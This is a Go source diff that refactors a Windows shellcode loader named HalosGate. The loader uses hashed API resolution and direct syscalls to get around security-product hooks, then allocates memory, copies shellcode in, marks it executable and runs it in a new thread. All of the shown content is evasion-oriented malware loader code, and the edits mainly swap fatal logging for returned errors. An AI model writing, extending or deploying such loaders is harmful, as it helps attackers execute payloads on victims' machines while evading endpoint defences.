@@ -5,10 +5,12 @@ import (
 	"crypto/sha256"
 	"encoding/hex"
 	"fmt"
-	"github.com/timwhitez/Doge-Gabh/pkg/Gabh"
 	"syscall"
 	"unsafe"
-	"variant/log"
+
+	"golang.org/x/sys/windows"
+
+	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
 )
 
 const (
@@ -17,39 +19,50 @@ const (
 	NCT = "NtCreateThreadEx"
 )
 
-func HalosGate(shellcode []byte) {
-	// loader
+// HalosGate loader
+func HalosGate(shellcode []byte) error {
 	var thisThread = uintptr(0xffffffffffffffff)
 
-	vNtAllocateVirtualMemory, err := gabh.MemHgate(str2sha1(NAM), str2sha1)
-	if err != nil {
-		log.Fatal(err)
+	vNtAllocateVirtualMemory, namErr := gabh.MemHgate(str2sha1(NAM), str2sha1)
+	if namErr != nil {
+		return fmt.Errorf("vNtAllocateVirtualMemory failed: %w", namErr)
 	}
 
-	vNtProtectVirtualMemory, err := gabh.DiskHgate(Sha256Hex(NPM), Sha256Hex)
-	if err != nil {
-		log.Fatal(err)
+	vNtProtectVirtualMemory, npmErr := gabh.DiskHgate(Sha256Hex(NPM), Sha256Hex)
+	if npmErr != nil {
+		return fmt.Errorf("vNtProtectVirtualMemory failed: %w", npmErr)
 	}
 
-	vCreateThread, err := gabh.MemHgate(Sha256Hex(NCT), Sha256Hex)
-	if err != nil {
-		log.Fatal(err)
+	vCreateThread, nctErr := gabh.MemHgate(Sha256Hex(NCT), Sha256Hex)
+	if nctErr != nil {
+		return fmt.Errorf("vCreateThread failed: %w", nctErr)
 	}
 
-	vWaitForSingleObject, _, err := gabh.DiskFuncPtr("kernel32.dll", str2sha1("WaitForSingleObject"), str2sha1)
-	if err != nil {
-		log.Fatal(err)
+	vWaitForSingleObject, _, vWErr := gabh.DiskFuncPtr(
+		"kernel32.dll",
+		str2sha1("WaitForSingleObject"),
+		str2sha1,
+	)
+	if vWErr != nil {
+		return fmt.Errorf("vWaitForSingleObject failed: %w", vWErr)
 	}
 
-	createThread(shellcode, thisThread, vNtAllocateVirtualMemory, vNtProtectVirtualMemory, vCreateThread, vWaitForSingleObject)
+	ctErr := createThread(
+		shellcode,
+		thisThread,
+		vNtAllocateVirtualMemory,
+		vNtProtectVirtualMemory,
+		vCreateThread,
+		vWaitForSingleObject,
+	)
+	if ctErr != nil {
+		return ctErr
+	}
+
+	return nil
 }
 
-func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, vWaitForSingleObject uint64) {
-
-	const (
-		memCommit  = uintptr(0x00001000)
-		memReserve = uintptr(0x00002000)
-	)
+func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, vWaitForSingleObject uint64) error {
 
 	var baseA uintptr
 	regionsize := uintptr(len(shellcode))
@@ -59,52 +72,68 @@ func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid
 		uintptr(unsafe.Pointer(&baseA)),
 		0,
 		uintptr(unsafe.Pointer(&regionsize)),
-		memCommit|memReserve,
-		syscall.PAGE_READWRITE,
+		windows.MEM_COMMIT|windows.MEM_RESERVE,
+		windows.PAGE_READWRITE,
 	)
 	if err != nil {
-		log.Fatalf("1 %s %x", err, r1)
+		return fmt.Errorf("1 %s %x", err, r1)
 	}
 
 	memcpy(baseA, shellcode)
 
 	var oldProtect uintptr
-	r1, err = gabh.HgSyscall(
-		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
+	r1, ntPvmErr := gabh.HgSyscall(
+		NtProtectVirtualMemorySysid, // NtProtectVirtualMemory
 		handle,
 		uintptr(unsafe.Pointer(&baseA)),
 		uintptr(unsafe.Pointer(&regionsize)),
-		syscall.PAGE_EXECUTE_READ,
+		windows.PAGE_EXECUTE_READ,
 		uintptr(unsafe.Pointer(&oldProtect)),
 	)
-	if err != nil {
-		log.Fatalf("1 %s %x", err, r1)
+	if ntPvmErr != nil {
+		return fmt.Errorf("1 %s %x", ntPvmErr, r1)
 	}
+
 	var hhosthread uintptr
-	r1, err = gabh.HgSyscall(
-		NtCreateThreadExSysid,                //NtCreateThreadEx
-		uintptr(unsafe.Pointer(&hhosthread)), //hthread
-		0x1FFFFF,                             //desiredaccess
-		0,                                    //objattributes
-		handle,                               //processhandle
-		baseA,                                //lpstartaddress
-		0,                                    //lpparam
-		uintptr(0),                           //createsuspended
-		0,                                    //zerobits
-		0,                                    //sizeofstackcommit
-		0,                                    //sizeofstackreserve
-		0,                                    //lpbytesbuffer
+	r1, ntCtErr := gabh.HgSyscall(
+		NtCreateThreadExSysid,                // NtCreateThreadEx
+		uintptr(unsafe.Pointer(&hhosthread)), // hthread
+		0x1FFFFF,                             // desiredaccess
+		0,                                    // objattributes
+		handle,                               // processhandle
+		baseA,                                // lpstartaddress
+		0,                                    // lpparam
+		uintptr(0),                           // createsuspended
+		0,                                    // zerobits
+		0,                                    // sizeofstackcommit
+		0,                                    // sizeofstackreserve
+		0,                                    // lpbytesbuffer
 	)
-	syscall.Syscall(uintptr(vWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
-	if err != nil {
-		log.Fatalf("1 %s %x", err, r1)
+	if ntCtErr != nil {
+		return fmt.Errorf("1 %s %x", ntCtErr, r1)
 	}
+
+	_, _, sysErr := syscall.SyscallN(uintptr(vWaitForSingleObject), hhosthread, windows.INFINITE, 0)
+	if sysErr != 0 {
+		return fmt.Errorf("1 %s %x", err, r1)
+	}
+
+	return nil
 }
 
+/*
 func memcpy(base uintptr, buf []byte) {
 	for i := 0; i < len(buf); i++ {
 		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
 	}
+}*/
+
+func memcpy(dst uintptr, src []byte) error {
+	ptr := (*byte)(unsafe.Pointer(dst))
+	addr := unsafe.Slice(ptr, len(src))
+	copy(addr, src)
+
+	return nil
 }
 
 func str2sha1(s string) string {
